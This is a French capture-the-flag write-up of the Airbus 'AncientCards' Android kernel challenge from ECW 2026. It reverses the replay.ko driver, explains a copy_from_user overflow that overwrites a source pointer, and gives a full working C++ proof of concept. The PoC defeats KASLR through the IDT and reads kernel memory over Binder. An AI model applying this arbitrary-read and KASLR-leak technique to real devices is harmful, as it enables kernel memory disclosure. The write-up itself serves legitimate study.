---
title: AncientCards - Airbus · ECW 2026
date: 2026-11-20
level: 16
tags: kernel, pwn, android, ecw-2026, airbus
excerpt: Writeup du challenge Android kernel pwn AncientCards (Airbus, ECW 2026, 1 solve ESNA) : reverse du module replay.ko, overflow via copy_from_user, defeat KASLR par l'IDT, lecture du flag.
---

Challenge Android (pwn kernel) d'**Airbus** à l'**ECW 2026**, **1 seul solve** : l'équipe **ESNA**.

À la base c'est packagé comme un chall **infra** : un `nmap` sur le réseau remonte un **FTP ouvert (sans auth)**, et dedans un flag + un **7z** qui contient tout le reste. Airbus donnait l'IP d'un Android exposé en **adb**, et le 7z embarquait **toute la VM du chall** (image émulateur + binaires + driver) pour pouvoir **debug en local**. 

On l'a solve à deux dans l'équipe **ESNA** : **brsd** (mon coéquipier) et moi.
### Run le chall en local

Pour rejouer en local, un petit `run.sh` enregistre l'AVD fourni et boot l'image dans l'émulateur Android :

```bash
#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"
AVD=AncientCards_Challenge
ROOT="$PWD"

# enregistre l'AVD fourni (en le pointant sur les images locales)
mkdir -p ~/.android/avd
sed -i "s#^path=.*#path=$ROOT/avd-home/$AVD.avd#" avd-home/$AVD.ini
cp -f avd-home/$AVD.ini ~/.android/avd/
ln -sfn "$ROOT/avd-home/$AVD.avd" ~/.android/avd/$AVD.avd
grep -q "image.sysdir.1=$ROOT/images" avd-home/$AVD.avd/config.ini \
  || echo "image.sysdir.1=$ROOT/images" >> avd-home/$AVD.avd/config.ini
cp -f keys/adbkey keys/adbkey.pub ~/.android/ 2>/dev/null || true
export ANDROID_AVD_HOME=~/.android/avd
emulator -avd $AVD -no-snapshot-load -qemu -enable-kvm "$@"
```


![Pasted image 20261119185801](assets/pasted-20261119185801.png)


## Récupérer l'APK

Le chall est un jeu de cartes (*AncientCards*), donc une appli tourne sur le device et parle au service. On la retrouve et on la pull via adb :

![Pasted image 20261120220046](assets/pasted-20261120220046.png)

```bash
adb shell pm list packages | grep -i lab    # -> com.lab.ancientcards
adb shell pm path com.lab.ancientcards       # -> /data/app/.../base.apk
adb pull <ce_chemin> ancientcards.apk
```


On la gardera pour plus tard (on la décompilera avec jadx pour voir comment elle parle au service).

## Le service en root

Il y a un service qui tourne en root, pas vraiment un truc par défaut sur un Android.

```
ps -A | grep root
```

![Pasted image 20261120152419](assets/pasted-20261120152419.png)

En récupérant le binaire associé à ce service et en le mettant dans IDA, on voit beaucoup de fonctions sans aucun symbole.

![Pasted image 20261119190429](assets/pasted-20261119190429.png)

Du coup pour retrouver le main : un petit string + xref dessus.

![Pasted image 20261119190451](assets/pasted-20261119190451.png)

Ce genre de chaine montre que c'est un binaire compilé via le NDK android. C'est le descriptor d’une interface AIDL. C’est l’identifiant de l’interface Binder `IReplayService` dans le package `com.lab.replay`. on retrouve aussi la chaine ancientcards  qui est le nom du chall donc bon c'est qu'on est sur le bon chemin i guess. Un ptit xref dessus et on se trouve dans le main du service.

## Main du service

On voit qu'il utilise le module replay et qu'il lit un fichier nommé secret (le flag). Ma première envie c'est donc de trouver un bug pour lire la stack et le flag, mais vu la taille du binaire ça aurait été très long de trouver les primitives intéressantes...

En reversant le service on peux voir qu'il sert de pont entre nous et le driver replay.

![Pasted image 20261119190522](assets/pasted-20261119190522.png)

C'est pour cela que nous avons pivoté sur le driver directement pour voir si il y avais pas un bug dedans.

### Recon du driver replay.ko

Si on check le driver sur notre vm via adb

![Pasted image 20261120151801](assets/pasted-20261120151801.png)

Il est accessible seulement depuis le user root, on sera donc forcé de passer par l'interface AIDL du service Android.

## Reverse du module kernel

Du coup le point d'entré du driver est la fonction `replay_ioctl`

Apres cartographie des ioctls du driver (on peut determiner ces noms la en essayant de faire des liaisons entre l'ioctl appelé et les symboles / strings de l'apk sous jadx).

![Pasted image 20261120215136](assets/pasted-20261120215136.png)

| nr  | cmd        | size | handler | méthode       |
| --- | ---------- | ---- | ------- | ------------- |
| 1   | 0xC0185201 | 0x18 | +0x4b4  | createSession |
| 2   | 0x40085202 | 0x08 | +0x740  | closeSession  |
| 3   | 0xC0305203 | 0x30 | +0x2d1  | WriteEvent    |
| 4   | 0xC0185204 | 0x18 | +0x8be  | readReplay    |
|     |            |      |         |               |

#### createSession (0xC0185201)

Elle alloue et enregistre une session. Décompile annoté :

![Pasted image 20261120162010](assets/pasted-20261120162010.png)

Dans l'ordre, le handler :

- lit la requête (`copy_from_user`, 24o) et refuse si le driver est pas init (`g_state == 0`) ;
- alloue **trois objets** : la **session** (`0x60`), le **ring** d'events (`0x100`) et le **ctx** (`0xC0`) ;
- remplit la session : `id` (compteur `next_session_id`), `generation`, et l'`owner_uid/pid` qui est **repris directement de la requête user** ;
- init le ring (magic `RER1`, `event_size = 56`) et surtout le ctx : `ctx->source (0x98) = ring` et `ctx->len (0xA0) = 256`. C'est le couple **(pointeur, taille)** que le `readReplay` va suivre ;
- accroche la session **en queue** de la liste chaînée globale (`list_add_tail` sur la tête `g_state+8`), incrémente le compteur, et renvoie l'`id` à l'user.

Le point à garder en tête : après un createSession propre, `ctx->source`/`ctx->len` pointent vers le ring alloué pdt la création de la session.

#### Les structs determiné via cet ioctl

Trois structs se baladent dans tout le driver (je mets que l'essentiel) :

```c
struct user_replay_session {   // 0x60
    struct list_head node;     // 0x00  chaînage dans la liste globale
    u64              id;       // 0x10  id de la session
    ....                       // owner_uid/pid, generation
    replay_ctx      *ctx;      // 0x28  -> ctx
    struct mutex     lock;     // 0x30
};

struct replay_ctx {            // 0xC0
    u8      junk_data[152];     // 0x00  buffer de 152 o (c'est lui qui déborde)
    void   *source;            // 0x98  -> ring  (ce que readReplay lit)
    u32     len;               // 0xA0  taille à lire
    ....                       // flags, session_id, generation....
};

struct user_ring_buffer {      // 0x100
    u32   magic;               // 0x00  "RER1"
    ....                       // version, event_size, indices
    replay_event events[4];    // 0x20
};
```

En schéma, les pointeurs entre les trois :

![replay-structs](assets/replay-structs.png)

#### WriteEvent (0xC0305203)

![Pasted image 20261120164059](assets/pasted-20261120164059.png)

Cet ioctl prend une requête de 0x30 (48o) en gros `{ session_id, user_ptr, total_len, ... }`  et il est censé copier `total_len` octets depuis `user_ptr` dans le **snapshot du ctx** (le buffer de 152 octets au début de la struct replay_ctx).

Ya donc un overflow dans la structure : le `if` ne vérifie que **`total_len > 0xC0`** (la taille complète du `replay_ctx`), pas `0x98` (la taille du `junk_data`). Le `copy_from_user` est donc plafonné à **0xC0 (192 o)** au lieu de **0x98 (152 o)**. Du coup tout ce qu'on envoie au-delà de **152 (0x98)** octets, jusqu'à **0xC0**, déborde du `junk_data[152]` et vient écrire **par-dessus les champs qui suivent dans le ctx** : `source` (0x98) et `len` (0xA0).

![replay-overflow](assets/replay-overflow.png)

Et ces champs, on les contrôle au byte près puisque c'est notre payload qui déborde. Concrètement, après un write de taille > 0x98, on a :

- `ctx->source (0x98)` = **le pointeur qu'on veut** (n'importe quelle adresse kernel),
- `ctx->len (0xA0)` = **la taille qu'on veut** (bornée à 0x100 côté lecture).

Autrement dit on a une primitive d'écriture sur le ctx qui nous laisse **faire pointer le "ring" de notre session où on veut, avec la taille de notre choix**.

#### ReadReplay  (0xC0185204)

![Pasted image 20261120163958](assets/pasted-20261120163958.png)

C'est le read du driver : il relit ce que `ctx->source` (0x98) pointe, sur `ctx->len` (0xA0) octets, et le renvoie en userspace. La requête fait 0x18 (24o) : `{ session_id, len, out_ptr }`.

En temps normal `source`/`len` pointent sur le ring, donc on relit juste notre propre état. **Mais après l'overflow du WriteEvent, ce couple est sous notre contrôle.** Du coup :

1. un WriteEvent > 152 octets pour écraser `ctx->source = &g_validation_secret` et `ctx->len = taille du secret` ;
2. on appelle ReadReplay (`0xC0185204`) ;
3. le driver fait `memcpy(tmp, ctx->source, len)` puis `copy_to_user(out_ptr, tmp, len)`  il nous donne la mémoire pointée.

Comme `source` est maintenant une adresse kernel **arbitraire**, c'est une **lecture arbitraire** : on lit directement `g_validation_secret` (le flag) contenue dans le module kernel.

![replay-read](assets/replay-read.png)

## Le pont Binder (comment on parle au driver)

Du coup ptit probleme le module kernel est accessible seulement pour le user root.

![Pasted image 20261120212912](assets/pasted-20261120212912.png)

Du coup on ne tape pas `/dev/replay` directement (root only). On passe par le service, et l'app elle-même nous montre l'interface. Dans l'APK décompilé (jadx) `ReplayBridge` :


![Pasted image 20261120213349](assets/pasted-20261120213349.png)

On retrouve certaines fonctions qui permettent de communiquer avec notre module kernel.
#### AppendEvent ( write)

![Pasted image 20261120181027](assets/pasted-20261120181027.png)

#### CreateSession

![Pasted image 20261120181108](assets/pasted-20261120181108.png)


Il manque quand même la fonction pour read malheureusement, mais on voit que l'apk utilise la libreplay.so qui elle n'est pas strippée.

Par exemple en cherchant dans les symboles de la lib on peut retrouver notre fonction read (readReplay) qui communique avec le binder du service, et donc avec le module kernel.

![Pasted image 20261120211820](assets/pasted-20261120211820.png)

Et `readReplay` (le read qui manquait côté Java) **est là**, avec les autres. La lib garde ses symboles C++ : un `nm -DC libreplay.so` donne les méthodes avec leurs signatures, donc on sait direct **quoi appeler et avec quels params**.

![Pasted image 20261120213219](assets/pasted-20261120213219.png)

On peut donc refaire l'exploit en C++ en utilisant la lib pour communiquer avec le service, qui forward vers les ioctl !

Pour obtenir le proxy (le `svc` sur lequel on appelle les méthodes), on recopie ce que fait la lib dans son JNI `createSession` : `AServiceManager_waitForService("com.lab.replay.IReplayService/default")` pour choper le binder, puis `IReplayService::fromBinder(binder)` pour l'emballer. C'est la fonction `connect_service` du PoC.

### Le PoC natif complet (`exploit.cpp`)

```cpp
#include <android/binder_auto_utils.h>

#include <vector>
#include <memory>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <unistd.h>
#include <dlfcn.h>


namespace aidl { namespace com { namespace lab { namespace replay {

class IReplayService
{
public:
    static std::shared_ptr<IReplayService> fromBinder(const ::ndk::SpAIBinder&);
};

class BpReplayService
{
public: // fonctions exportees de libreplay.so (signatures lues avec nm -DC)
    ::ndk::ScopedAStatus createSession(int64_t* out_session);

    ::ndk::ScopedAStatus appendEvent(int64_t session,
                                     const std::vector<uint8_t>& event,
                                     std::vector<uint8_t>* out);

    ::ndk::ScopedAStatus readReplay(int64_t session,
                                    int32_t len,
                                    std::vector<uint8_t>* out);
};

}}}}  // namespace aidl::com::lab::replay

using aidl::com::lab::replay::IReplayService;
using aidl::com::lab::replay::BpReplayService;


static const uint64_t IDT_FIXED    = 0xfffffe0000000000ULL;   // IDT a adresse fixe (pas KASLR)
static const uint64_t IDT0_NOSLIDE = 0xffffffff820008f0ULL;   // handler #DE sans slide
static const uint64_t KERNEL_BASE  = 0xffffffff81000000ULL;   // base kernel sans KASLR
static const uint64_t G_SECRET     = 0xffffffff837ec630ULL;   // g_validation_secret sans slide


// ServiceManager -> SpAIBinder -> proxy BpReplayService
static std::shared_ptr<IReplayService> connect_service()
{
    using getsvc_t = AIBinder* (*)(const char*);

    //  AServiceManager_getService pas dans les headers NDK publics -> dlsym au runtime
    getsvc_t get_service = (getsvc_t) dlsym(RTLD_DEFAULT, "AServiceManager_getService");
    if (!get_service) return nullptr;

    AIBinder* raw = get_service("com.lab.replay.IReplayService/default");
    if (!raw) return nullptr;

    ::ndk::SpAIBinder binder(raw);
    return IReplayService::fromBinder(binder);
}

//  blob d'overflow (0xB8 o) : > 152 => ecrase ctx->source (0x98) et ctx->len (0xA0)
static std::vector<uint8_t> make_overflow_blob(uint64_t addr, uint32_t len)
{
    std::vector<uint8_t> b(0xB8, 0);
    b[0] = 'R'; b[1] = 'E'; b[2] = 'R'; b[3] = '1';   // magic attendu
    b[0x18] = 0;                                       // header[0x18] < 9 requis
    memcpy(&b[0x98], &addr, 8);                        // ctx->source
    memcpy(&b[0xA0], &len,  4);                        // ctx->len
    return b;
}

// une fonction par methode de la lib
static int64_t create_session(BpReplayService* svc)
{
    int64_t session = 0;
    svc->createSession(&session);
    return session;
}

static void write_event(BpReplayService* svc, int64_t session, const std::vector<uint8_t>& blob)
{
    std::vector<uint8_t> ignored;
    svc->appendEvent(session, blob, &ignored);        // overflow
}

static std::vector<uint8_t> read_replay(BpReplayService* svc, int64_t session, uint32_t len)
{
    std::vector<uint8_t> out;
    svc->readReplay(session, len, &out);
    return out;
}

// read arbitraire = overflow (write) + readReplay (read)
static std::vector<uint8_t> read_at(BpReplayService* svc, int64_t session, uint64_t addr, uint32_t len)
{
    write_event(svc, session, make_overflow_blob(addr, len));
    return read_replay(svc, session, len);
}

int main()
{
    std::shared_ptr<IReplayService> service = connect_service();
    if (!service) { printf("[-] service introuvable\n"); return 1; }
    BpReplayService* svc = reinterpret_cast<BpReplayService*>(service.get());

    int64_t session = create_session(svc);
    printf("[+] session 0x%llx\n", (unsigned long long) session);

    // --- defeat KASLR : on lit l'IDT a son adresse fixe ---
    std::vector<uint8_t> idt = read_at(svc, session, IDT_FIXED, 0x10);
    uint64_t handler = ((uint64_t) *(uint32_t*)&idt[8] << 32)
                     | ((uint64_t) *(uint16_t*)&idt[6] << 16)
                     |             *(uint16_t*)&idt[0];
    printf("[+] IDT[0] handler  = 0x%llx\n", (unsigned long long) handler);

    uint64_t slide       = handler - IDT0_NOSLIDE;
    uint64_t kernel_base = KERNEL_BASE + slide;
    printf("[+] KASLR slide     = 0x%llx\n", (unsigned long long) slide);
    printf("[+] kernel base     = 0x%llx\n", (unsigned long long) kernel_base);

    // --- leak du secret ---
    uint64_t secret = G_SECRET + slide;
    printf("[+] secret          = 0x%llx\n", (unsigned long long) secret);

    std::vector<uint8_t> flag = read_at(svc, session, secret, 0x20);
    printf("[+] FLAG=");
    for (uint8_t c : flag) putchar((c >= 32 && c < 127) ? c : '.');
    printf("\n");
    return 0;
}
```

Pas besoin de root : le service **accepte l'uid shell (2000)**, donc on lance le binaire directement via `adb shell`.

Build + run (uid 2000, sans root) :

```bash
clang++ --target=x86_64-linux-android33 -std=c++17 exploit.cpp \
        -L. -lreplay -lbinder_ndk -llog -Wl,--allow-shlib-undefined -o exploit

adb push exploit libreplay.so libc++_shared.so /data/local/tmp/ 
adb shell "LD_LIBRARY_PATH=/data/local/tmp /data/local/tmp/exploit"
```

Sortie :

![Pasted image 20261120211526](assets/pasted-20261120211526.png)
